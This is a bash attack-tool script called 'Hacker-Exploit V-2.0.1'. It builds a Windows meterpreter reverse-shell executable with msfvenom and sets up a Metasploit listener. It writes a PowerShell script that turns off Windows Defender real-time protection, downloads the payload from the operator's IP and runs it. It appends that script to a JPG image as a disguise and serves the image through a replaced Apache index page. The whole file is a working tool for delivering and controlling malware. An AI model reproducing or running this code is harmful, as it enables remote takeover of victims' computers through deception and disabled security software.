#!/bin/bash





clear
#color input ==============================================================
ED=$'\e[1;31m'
GREEN=$'\e[1;32m'
YELLOW=$'\e[1;33m'
BLUE=$'\e[1;34m'
RED=$'\e[1;31m'
RESTORE=$'\e[0m'

chmod 777 *




clear

#logo or name
	echo "${GREEN} WELCOME TO The ${RESTORE}"
	echo "${RESTORE}"
	echo "${YELLOW}"

echo "                                                                                                          "     
echo " ██╗  ██╗ █████╗  ██████╗██╗  ██╗███████╗██████╗     ███████╗██╗  ██╗██████╗ ██╗      ██████╗ ██╗████████╗"
echo " ██║  ██║██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗    ██╔════╝╚██╗██╔╝██╔══██╗██║     ██╔═══██╗██║╚══██╔══╝"
echo " ███████║███████║██║     █████╔╝ █████╗  ██████╔╝    █████╗   ╚███╔╝ ██████╔╝██║     ██║   ██║██║   ██║   "
echo " ██╔══██║██╔══██║██║     ██╔═██╗ ██╔══╝  ██╔══██╗    ██╔══╝   ██╔██╗ ██╔═══╝ ██║     ██║   ██║██║   ██║   "
echo " ██║  ██║██║  ██║╚██████╗██║  ██╗███████╗██║  ██║    ███████╗██╔╝ ██╗██║     ███████╗╚██████╔╝██║   ██║   "
echo " ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝    ╚══════╝╚═╝  ╚═╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝   "
echo "                                                                                                          "
egrep -i ver toolinfo;
echo "${RESTORE}"
echo "${RED}=============================================================================================================="
echo "${RESTORE}"

	
	echo "${GREEN}your ip info.. "

	ifconfig
	echo "${RESTORE}"

	echo " please input your current interface ip "
	read -p ' HE :~' IP

	echo " please input your Choice Port number "
	read -p ' HE :~ ' PORT

	































	#clear input from ======================================================= 

	clear 

	#logo display ==============================================================

	echo " WELCOME TO The "
	
	echo "                                                                                                          "     
	echo " ██╗  ██╗ █████╗  ██████╗██╗  ██╗███████╗██████╗     ███████╗██╗  ██╗██████╗ ██╗      ██████╗ ██╗████████╗"
	echo " ██║  ██║██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗    ██╔════╝╚██╗██╔╝██╔══██╗██║     ██╔═══██╗██║╚══██╔══╝"
	echo " ███████║███████║██║     █████╔╝ █████╗  ██████╔╝    █████╗   ╚███╔╝ ██████╔╝██║     ██║   ██║██║   ██║   "
	echo " ██╔══██║██╔══██║██║     ██╔═██╗ ██╔══╝  ██╔══██╗    ██╔══╝   ██╔██╗ ██╔═══╝ ██║     ██║   ██║██║   ██║   "
	echo " ██║  ██║██║  ██║╚██████╗██║  ██╗███████╗██║  ██║    ███████╗██╔╝ ██╗██║     ███████╗╚██████╔╝██║   ██║   "
	echo " ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝    ╚══════╝╚═╝  ╚═╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝   "
	echo "                                                                                                          "
	echo " V-2.0.1"

	echo "=============================================================================================================="
	echo "your LHOST or local ip was set '$IP' "
	echo "your LPORT or local port was set '$PORT' "
	
	
	echo "=============================================================================================================="




			#ALL - ACTION RUN =====================================================================================
			
			
			echo "${YELLOW}[*] EXAMPUL : ${BLUE}correct spelling : ${GREEN}[ WH-hackerexploit ] ${RESTORE}and ${BLUE}Wrong spelling : ${RED} [ WH hackerexploit ]"
			echo "${YELLOW}[*]  Must be use [ _  or - ] don't use [ ] Space"
			echo "[*]  please input your Output App name "			
			read -p ${RESTORE}' HE :~ ' APPNAME 

			echo "[*]  please input your ( JPG ) name [ Exampul : abcd.jpeg ; 1234.jpg ; ab12.jpg] "
			echo "[*] ${YELLOW} Must cpoy in tool dir ! "
			read -p ${RESTORE}' HE :~ ' IMG 

			#=====TEMP==DELETE==AND==CREATE===========
			rm -rf ./temp
			rm -rf ./WH-output
			mkdir ./temp
			mkdir ./WH-output
			touch ./temp/$APPNAME.rc
			#=====TEMP==DELETE==AND==CREATE===========
echo "${RESTORE} "
echo "=============================================================================================="
echo "${YELLOW}[*] MSFVEMON  windows/meterpreter/reverse_tcp > Payload generating >  Start . ${GREEN} DONE${RESTORE} " 
echo "${RESTORE} "	
		echo "${GREEN}"
			#=======================PAYLOAD CREATE================================= 
			 
	msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp  LHOST=$IP LPORT=$PORT -b "\x00" -f exe -o ./WH-output/$APPNAME.exe

			

			echo "${YELLOW}[*] payload generator >  complete . ${GREEN} DONE${RESTORE} " 

			
			sleep 0.80;
			touch ./temp/$APPNAME.rc 
			echo "${YELLOW}[*] Temp data create >  complete . ${GREEN} DONE${RESTORE} " 
			#========exquate ip & port & handeler & payload  ==============================

			echo " use exploit/multi/handler" >> ./temp/$APPNAME.rc 
			echo " set PAYLOAD windows/meterpreter/reverse_tcp " >> ./temp/$APPNAME.rc
			echo " set LHOST $IP " >> ./temp/$APPNAME.rc	
			echo " set LPORT $PORT " >> ./temp/$APPNAME.rc
			echo "set ExitOnSession false " >> ./temp/$APPNAME.rc	
			echo " exploit -j -z " >> ./temp/$APPNAME.rc 
			#msg =============================================================
			
			echo "${YELLOW}[*] MSF $APPNAME.RC generator  >  complete . ${GREEN} DONE${RESTORE} " 



			#==============================DOWNLOAD================================			
			
				
				#=================POWERSHELL-START================
sleep 2.3;
echo "${YELLOW}[*] windows-defender disable Powershell script createing >  Start . ${GREEN} DONE${RESTORE} " 



cp ./power/powershell.ps1 ./temp/$APPNAME.ps1
sleep 1.1;
namef="$"
namef2="false"
namet="$"
namet2="true"
echo "Set-MpPreference -DisableRealtimeMonitoring $namef$namef2" >> ./temp/$APPNAME.ps1
echo "Set-MpPreference -DisableRealtimeMonitoring $namet$namet2" >> ./temp/$APPNAME.ps1
				
echo "cd \ " >> ./temp/$APPNAME.ps1
echo " iwr http://$IP/wh_output/$APPNAME.exe -OutFile $APPNAME.exe " >> ./temp/$APPNAME.ps1
echo " iwr http://$IP/wh_output/$APPNAME.exe -OutFile $APPNAME.2.exe " >> ./temp/$APPNAME.ps1
echo "./$APPNAME.exe" >> ./temp/$APPNAME.ps1
echo "./$APPNAME.2.exe" >> ./temp/$APPNAME.ps1
sleep 2.6;
echo "${YELLOW}[*] windows-defender disable and run payload Powershell script >  Complete . ${GREEN} DONE${RESTORE} " 


sleep 1.1;
service apache2 start
sleep 2.3;
echo "${YELLOW}[*] apache2 has been start  >  Complete . ${GREEN} DONE${RESTORE} " 


				#=================POWERSHELL-END================


			


			#====index-start=====			
			rm -rf /var/www/html/index.html			
			rm -rf /var/www/html/wh_output
			rm -rf ./temp/index.html 
			sleep 1.3;

			
				
			mkdir  /var/www/html/wh_output
			touch ./temp/index.html
			sleep 1.3;			
			cp ./WH-output/$APPNAME.exe /var/www/html/wh_output/
			cp ./temp/$APPNAME.ps1 ./
			cat $IMG $APPNAME.ps1 >$APPNAME.jpg
			sleep 1.3;
			mv $APPNAME.jpg ./WH-output/
echo "${YELLOW}[*] Inject payload script into Image >  Complete . ${GREEN} DONE${RESTORE} " 			
			sleep 1.3;
echo "${YELLOW}[*] File download index.html createing >  Start . ${GREEN} DONE${RESTORE} " 
sleep 1.5;
cp ./WH-output/$APPNAME.jpg /var/www/html/wh_output/$APPNAME.jpg


			echo "<html>" >> ./temp/index.html
			echo "<body>" >> ./temp/index.html
			
			name6='"'
			echo "<a href=$name6./wh_output/$APPNAME.jpg $name6 download> " >> ./temp/index.html
			echo "$APPNAME" >> ./temp/index.html

			echo "</a>" >> ./temp/index.html
			echo "</body>" >> ./temp/index.html
			echo "</html>" >> ./temp/index.html
			sleep 2.1;
			cp ./temp/index.html /var/www/html/index.html
			sleep 2.1;
			#xterm -hold -T "Hacker-Exploit-V2" -e "./ngrok http -region eu 80" &
			#====index-end=====	
	echo "${YELLOW}[*] File download index.html file create  >  Complete . ${GREEN} DONE${RESTORE} " 


			

			
		#===================================DOWNLOAD-DONE======================================
























			#Sleep & clear & logo display ==============================================================
		
			sleep 7.1;
		
			clear
	

			echo "${GREEN}"

			echo " WELCOME TO The "
			echo "${BLUE}"	
			echo "                                                                                                          "     
			echo " ██╗  ██╗ █████╗  ██████╗██╗  ██╗███████╗██████╗     ███████╗██╗  ██╗██████╗ ██╗      ██████╗ ██╗████████╗"
			echo " ██║  ██║██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗    ██╔════╝╚██╗██╔╝██╔══██╗██║     ██╔═══██╗██║╚══██╔══╝"
			echo " ███████║███████║██║     █████╔╝ █████╗  ██████╔╝    █████╗   ╚███╔╝ ██████╔╝██║     ██║   ██║██║   ██║   "
			echo " ██╔══██║██╔══██║██║     ██╔═██╗ ██╔══╝  ██╔══██╗    ██╔══╝   ██╔██╗ ██╔═══╝ ██║     ██║   ██║██║   ██║   "
			echo " ██║  ██║██║  ██║╚██████╗██║  ██╗███████╗██║  ██║    ███████╗██╔╝ ██╗██║     ███████╗╚██████╔╝██║   ██║   "
			echo " ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝    ╚══════╝╚═╝  ╚═╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝   "
			echo "                                                                                                          "
			echo " V-2.0.1"
			echo "${YELLOW}"
			echo "=============================================================================================================="
			echo "your LHOST or local ip was set ${GREEN}'$IP' ${RESTORE}"
			echo "your LPORT or local port was set ${GREEN}'$PORT'${RESTORE} "
			echo "your output app name was set ${GREEN}'$APPNAME'${RESTORE} "
			echo "DOWNLOAD LINK ${GREEN}'http://$IP/index.html'${RESTORE} "			
			echo "opening msfconsole  "
			echo "=============================================================================================================="

			echo "${RESTORE}"


			msfconsole -r ./temp/$APPNAME.rc


			#ALL - ACTION COMPLETE =====================================================================================












































